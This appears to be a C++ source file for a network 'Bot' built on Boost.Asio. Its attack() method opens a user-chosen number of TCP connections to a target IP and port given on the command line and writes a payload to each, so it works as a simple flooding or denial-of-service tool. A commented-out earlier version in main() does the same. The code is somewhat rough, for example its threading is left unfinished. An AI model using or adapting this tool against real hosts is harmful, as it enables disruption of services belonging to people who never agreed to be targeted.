#include <stdlib.h>
#include <unistd.h>

#include "Bot1.h"
#include <iostream>
#include <thread>
#include "vector"
#include "string"

#include "boost/system/error_code.hpp"
#include <boost/thread/thread.hpp>
#include <boost/bind.hpp>
#include <boost/functional.hpp>


const int DELAY = 5;

//using namespace boost::asio;
typedef boost::shared_ptr<ip::tcp::socket> socket_ptr;

boost::mutex data_mut;
boost::mutex io_mutex;
boost::condition_variable cond_var;
bool ready_socket = false;


class Bot{
private:
    io_service service;
    ip::tcp::endpoint ep;
    //ip::tcp::acceptor acc;
    size_t NUMBER_OF_THREADS = 4;

    void run(){
        for(size_t i=0; i<this->socket_number; ++i) {
            socket_ptr sock(new ip::tcp::socket(this->service));
            connect(sock);
        }
        this->service.run();
    }

    void connect(socket_ptr sock){
        sock.get()->async_connect(this->ep,
                                  [this, sock](const boost::system::error_code& ec)
                                  {
                                      handle_connect(ec, sock);
                                  });
    }

    void handle_connect(const boost::system::error_code& ec, socket_ptr sock){
        if (!ec) {
            size_t bytes_tr;
            sock.get()->async_write_some(buffer(this->request),
                                         [this, sock](const boost::system::error_code& ec, size_t bytes_trans)
                                        {
                                            handle_write(ec, bytes_trans, sock);
                                        }   );
            //write(*sock, buffer(this->request));
        }else{
            std::cerr << ec.message() << std::endl;
        }

    }

    void handle_write(const boost::system::error_code& ec, size_t bytes_trans, socket_ptr sock){
        if (!ec) {
            std::cout <<"Success" << std::endl;
            std::string response;
            sock.get()->close();
            //sock.get()->async_read_some(buffer(response), bind(&Bot::handle_read, this, ec, sock));
        }else{
            std::cerr << ec.message() << std::endl;
        }
    }

    void handle_read(boost::system::error_code& ec, socket_ptr sock){
        if (!ec){
            sock.get()->close();
        }
    }

public:
    ip::address target;
    size_t port;
    std::string request;
    size_t socket_number;

    Bot(char* target, char* port, char* request, char* socket_number){
        this->target = ip::address::from_string(target);;
        this->port = (size_t)atoi(port);
        this->ep = ip::tcp::endpoint(this->target, this->port);
        this->request = std::string(request);
        this->socket_number = (size_t)atoi(socket_number);
    }

    void attack(){
        std::vector<boost::thread> threads;
        for (size_t i=0; i<this->NUMBER_OF_THREADS; ++i){
            run();
        }
        boost::this_thread::sleep( boost::posix_time::millisec(500));
    }


};

void sock_connect(socket_ptr sock, ip::tcp::endpoint &ep) {
    sock->connect(ep);
    //boost::lock_guard<boost::mutex> lg(io_mutex);
    //ready_socket = true;
    //cond_var.notify_one();
    boost::this_thread::sleep_for(boost::chrono::milliseconds(DELAY));
}

void my_write(socket_ptr sock_, std::string msg, ip::address &addr) {
    try {
//        boost::unique_lock<boost::mutex> lck(data_mut);
//        cond_var.wait(lck, [] { return ready_socket; });
//
//        boost::lock_guard<boost::mutex> lg(io_mutex);
//        ready_socket = false;
        //boost::lock_guard<boost::mutex> lg(data_mut);
        size_t res = sock_->write_some(buffer(msg));
        boost::this_thread::sleep_for(boost::chrono::milliseconds(DELAY));
    } catch (boost::system::system_error &e) {
        e.what();
        //return (size_t) -1;
    }
}

void hello(int a, std::string s, socket_ptr sock) {}

int main(int argc, char *argv[]) {
    Bot bot(argv[1], argv[2], argv[3], argv[4]);
    bot.attack();




//    char *URL = argv[1];
//    int NUM = std::atoi(argv[2]);
//    //curlppGetWithResp(URL);
//    //curlppMulti(URL, NUM);
//
//    Bot bot1(URL, NUM);
//    int fails = bot1.attack();
//    std::cout << "FAILED:" << fails << std::endl;
//    io_service service;
//    ip::address target = ip::address::from_string(argv[1]);
//    ip::tcp::endpoint ep(target, 2021);
//    ip::tcp::acceptor acc(service, ep);
//    const int socket_number = atoi(argv[3]);
//
//    //std::vector<boost::thread> connection_threads;
//
//    // writing threads
//    std::string msg = std::string(argv[2]);
//    std::vector<boost::thread> write_threads;
//
//    // connection
//    socket_ptr sockets[socket_number];
//    for (size_t i = 0; i < socket_number; ++i) {
//        socket_ptr sock(new ip::tcp::socket(service));
//        sockets[i] = sock;
//        //connection_threads.emplace_back(boost::thread(sock_connect, sock, boost::ref(ep) ));
//        sock_connect(sock, boost::ref(ep));
//        boost::this_thread::sleep_for(boost::chrono::milliseconds(DELAY));
//    }
//
//    //write data
//    size_t sock_indx;
//    for (size_t i = 0; i < socket_number; ++i) {
//        sock_indx = i % socket_number;
//        //msg.append("A");
//        //write_threads.emplace_back(boost::thread(my_write, sockets[sock_indx], std::string(msg), boost::ref(target) ));
//        my_write(sockets[sock_indx], std::string(msg), boost::ref(target));
//    }

//    for (auto &thr : connection_threads) {
//        thr.join();
//    }
//    for (auto &thr : write_threads) {
//        thr.join();
//    }


    return 0;
}
